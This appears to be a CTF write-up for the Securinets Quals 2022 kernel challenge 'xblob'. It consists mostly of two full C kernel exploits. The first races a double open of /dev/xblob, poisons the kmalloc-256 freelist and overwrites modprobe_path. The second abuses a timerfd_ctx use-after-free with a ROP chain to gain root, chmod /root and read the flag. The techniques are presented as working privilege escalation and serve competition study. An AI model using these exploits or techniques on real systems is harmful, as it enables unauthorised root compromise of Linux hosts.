---
title: Kernel-xblob-Securinets CTF Quals 2022
date: 2022-04-23 17:04:37
tags: 
    - double open
    - hard race condition
    - kmalloc-256
    - kernel-uaf
    - timerfd_ctx
    - 
---


### exp

* race condition

As is well-seen, thread t1 executes ahead of `fd2 = open("/dev/xblob", O_RDWR);` in semantics. But from my plain own prespective, the time consuming of thread t1 creation will offsets that.

The condition is checked in a singal flow(main thread), it will redece it's complication to a large extent.
```c
for(i=0; i<100000; i++) {
    fd1 = -1; fd2 = -1;
    pthread_create(&t1, NULL, oopen, NULL);
    fd2 = open("/dev/xblob", O_RDWR);
    pthread_join(t1, NULL);
    /* check in singal flow */
    if(fd1>0 && fd2>0)
        break;
    close(fd1);
    close(fd2);
}
printf("fd1, fd2 = (%d, %d) by %d \n", fd1, fd2, i);
```

* overwrite the next pointer

In this case, I overwrite the `next` pointer of kmalloc-256, which causes quite a few side effects. So shorten the control flow chain to cat flag as possible.

This is method can be patched by `Hardened freelist` or `Random freelist
` easily. So it's not a general method.

* exp.c

```c
#include <sys/ipc.h>
#include <sys/shm.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#define pause(msg) do{ write(1, msg, strlen(msg)); getc(stdin); }while(0)

typedef unsigned char u8;
typedef unsigned int  u32;
typedef unsigned long u64;

int fd1 = -1;
int fd2 = -1;

/* dump a chunk of memory */
void hexdump(u8* buffer, int num_bytes) {
    for(int i=0; i<num_bytes; i+=0x10){
        printf("%06x |", i);
        for (int j = 0; j < 0x10; j++) {
            if (j % 8 == 0)
                printf(" ");
            if (i < num_bytes)
                printf(" %02x", buffer[i+j]);
            else
                printf("   ");
        }
        printf("\n");
    }
}

void oopen() {
    fd1 = open("/dev/xblob", O_RDWR);
}

int 
main(int argc, char *argv[]) {
    int i;
    pthread_t t1;
    char buf[0x100];

    /* clean first randomly objects in kmalloc-256 */
    for(i=0; i<0x8; i++) {
        shmget(IPC_PRIVATE, 0x1000, 0666);
    }
    for(i=0; i<100000; i++) {
        fd1 = -1; fd2 = -1;
        pthread_create(&t1, NULL, oopen, NULL);
        fd2 = open("/dev/xblob", O_RDWR);
        pthread_join(t1, NULL);
        /* check in singal flow */
        if(fd1>0 && fd2>0)
            break;
        close(fd1);
        close(fd2);
    }
    printf("fd1, fd2 = (%d, %d) by %d \n", fd1, fd2, i);
    pause("Alright?");

/** assure that double open
    memset(buf, '\x41', 0x20);
    write(fd1, buf, 0x20);
    memset(buf, '\x00', 0x20);
    read(fd2, buf, 0x20);
    write(1, buf, 0x20);
*/
    close(fd2);
    shmget(IPC_PRIVATE, 0x1000, IPC_CREAT);
    read(fd1, buf, 0x100);
    u64 k_base = *(u64*)(buf+0xe0);
    hexdump(buf, 0x100);

    /* check whether k_base correct */
    if (k_base == 0) {
        close(fd1);
        exit(0);
    }
    k_base = k_base - 0xeb2bc0 ; 
    printf("%llx \n", k_base);
    pause("leak ?");
    
    /* overwrite next pointer */
    fd2 = open("/dev/xblob", O_RDWR);
    close(fd2);
    read(fd1, buf, 0x100);
    *(u64*)(buf+0x80) = k_base - 0xffffffff81000000 + 0xffffffff81e37e20;
    write(fd1, buf, 0x100);
    
    /* alloc a object to set next pointer of kmalloc256 pointes to modprobe_path, then alloc to modify modporbe_path */
    pause("modify modprobe_path");
    shmget(IPC_PRIVATE, 0x1000, IPC_CREAT);
    fd2 = open("/dev/xblob", O_RDWR);
    char *tmp_x = "/tmp/x";
    write(fd1, tmp_x, 8);

    /* trigger */
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /root/\n/bin/chmod 777 /root/*' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    
    /* securinets{1t's_v3ry_h4rd_2_byp4ss_SMAP_by_4bus1ng_timerfd_ctx} */
    system("cat /root/*");

    return 0;
}

/*
slab 0xffffffff81d79e20
*/
```

### another exp

This exploit demonstrate hijacing rip and get flag(not as usual) throught UAF of timerfd_ctx object.

A timerfd_ctx object is just like this in memory
```Shell
000:     0x0000000000000001      0xffffc9000017ba50
010:     0x0000000000000000      0x000000ed8083904d
020:     0x000000ed8083904d      0xffffffff81190990 <= function
030:     0xffff88800f91cc80      0x0000000000000001
040:     0x0000000000000000      0x0000000000000000
050:     0x0000000000000000      0x0000000000000000
060:     0x0000000000000000      0x0000000000000000
070:     0x0000000000000000      0x0000000000000000
080:     0x16eafd52329a2830      0x0000000000000000
090:     0xffff8880031bd190      0xffff8880031bd190
0a0:     0x0000000000000000      0x0000000000000000
0b0:     0x0000000000000000      0x0000000000000000
0c0:     0x0000000000000000      0x0000000000000000
0d0:     0x0000000000000000      0x0000000000000000
0e0:     0x0000000000000000      0x0000000000000000
0f0:     0x0000000000000000      0x0000000000000000
100:     0x0000000000000000      0x0000000000000000
```

Write the object like this , then you can rop.
```c
    *(u64*)(buf+0x08) = 0;                  /* rb_right */
    *(u64*)(buf+0x10) = K(0xffffffff81287e29); /* rb_left */  // add rsp,0x28; ret;
    *(u64*)(buf+0x18) = 0;                  /* expires */
    *(u64*)(buf+0x20) = 0;                  /* _softexpires (important) */
    *(u64*)(buf+0x28) = K(0xffffffff810b3291); /* tmrproc.function */ //push rdi; add [rbx+0x41],bl; pop rsp; pop r13; pop rbp; ret
    *(u64*)(buf+0x38) = 0; // state=0 to write rb_left
    
    u64* rop = (buf+0x40);
    *rop++ = ROP
```

As you damage this structure, it's prety hard to return usermode and get shell. But this exploit demonstrate a method, which is quite complicated. I use a method in the exp, and I think it inspirational.




```c
#define _GNU_SOURCE
#include <sys/ipc.h>
#include <sys/shm.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/wait.h>

#define pause(msg) do { write(1, msg, strlen(msg)); getc(stdin); }while(0)
#define error(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

typedef unsigned char u8;
typedef unsigned int  u32;
typedef unsigned long u64;

int fd1 = -1;
int fd2 = -1;
int tfd;

unsigned long user_cs, user_ss, user_rsp, user_rflags;
void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

int create_timer(int tv_sec) {
	int tfd;
	struct itimerspec its;
	its.it_interval.tv_sec = 0;
	its.it_interval.tv_nsec = 0;
	its.it_value.tv_sec = tv_sec;
	its.it_value.tv_nsec = 0;

    tfd = timerfd_create(CLOCK_REALTIME, 0);
    if (tfd == -1) {
        error("timerfd_create");
    }
	timerfd_settime(tfd, 0, &its, 0);
    return tfd;
}

/* dump a chunk of memory */
void hexdump(u8* buffer, int num_bytes) {
    for(int i=0; i<num_bytes; i+=0x10){
        printf("%06x |", i);
        for (int j = 0; j < 0x10; j++) {
            if (j % 8 == 0)
                printf(" ");
            if (i < num_bytes)
                printf(" %02x", buffer[i+j]);
            else
                printf("   ");
        }
        printf("\n");
    }
}

void oopen() {
    fd1 = open("/dev/xblob", O_RDWR);
}

int win_flag = 0;
void loop() {
    win_flag = 1;
    while(1);
}
void win() {
    while(!win_flag);
    system("/tmp/dummy");
    /* securinets{1t's_v3ry_h4rd_2_byp4ss_SMAP_by_4bus1ng_timerfd_ctx} */
    system("cat /root/*");
}

int  main(int argc, char *argv[]) {
    int i;
    pthread_t t1;
    char buf[0x400];
    char buf2[0x100];
    setvbuf(stdout, NULL, _IONBF, 0);

    save_state();
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /root\n/bin/chmod 777 /root/*\n' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    for(i=0; i<100000; i++) {
        fd1 = -1; fd2 = -1;
        pthread_create(&t1, NULL, oopen, NULL);
        fd2 = open("/dev/xblob", O_RDWR);
        pthread_join(t1, NULL);
        /* check in singal flow */
        if(fd1>0 && fd2>0)
            break;
        close(fd1);
        close(fd2);
    }
    printf("fd1, fd2 = (%d, %d) by %d \n", fd1, fd2, i);
    pause("Alright?");

    close(fd2);
    tfd = create_timer(1000);
    read(fd1, buf, 0x100);
    hexdump(buf, 0x100);
    u64 k_base = *(u64*)(buf+0x28);
    u64 g_buf = *(u64*)(buf+0x90) - 0x90;
    if (k_base == 0) {
        close(fd1);
        exit(1);
    }

    k_base -= 0x190990;
    hexdump(buf, 0x100);

    printf("k_base => 0x%llx \n", k_base);
    printf("g_buf  => 0x%llx \n", g_buf);

#define K(addr) ((u64)(addr)-(0xffffffff81000000)+k_base)    
    *(u64*)(buf+0x08) = 0;                  /* rb_right */
    *(u64*)(buf+0x10) = K(0xffffffff81287e29); /* rb_left */  // add rsp,0x28; ret;
    *(u64*)(buf+0x18) = 0;                  /* expires */
    *(u64*)(buf+0x20) = 0;                  /* _softexpires (important) */
    *(u64*)(buf+0x28) = K(0xffffffff810b3291); /* tmrproc.function */ //push rdi; add [rbx+0x41],bl; pop rsp; pop r13; pop rbp; ret
    *(u64*)(buf+0x38) = 0; // state=0 to write rb_left

    
    u64* rop = (buf+0x40);
    *rop++ = K(0xffffffff812755bb);  // pop rdx; pop rdi; ret
    *rop++ =    0x0000782f706d742f;  // "/tmp/x" not  K(0xffffffff812755bb); damn it
    *rop++ = K(0xffffffff81e37e20);  // modprobe_path
    *rop++ = K(0xffffffff81044f66);  // mov qword ptr [rdi], rdx ; ret
    // *rop++ = K(0xffffffff8100031d);  // jmp $+0

    *rop++ = K(0xffffffff81800e26); // return to usermode + 0x16
    *rop++ = 0xdeadbeef;
    *rop++ = 0xcafebabe;
    *rop++ = loop;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_rsp;
    *rop++ = user_ss;

    pthread_t t2;
    pthread_create(&t2, NULL, win, NULL);
    write(fd1, buf, 0x100);
    pause("Ok?");
    pthread_join(t2, NULL);
    return 0;
}
```
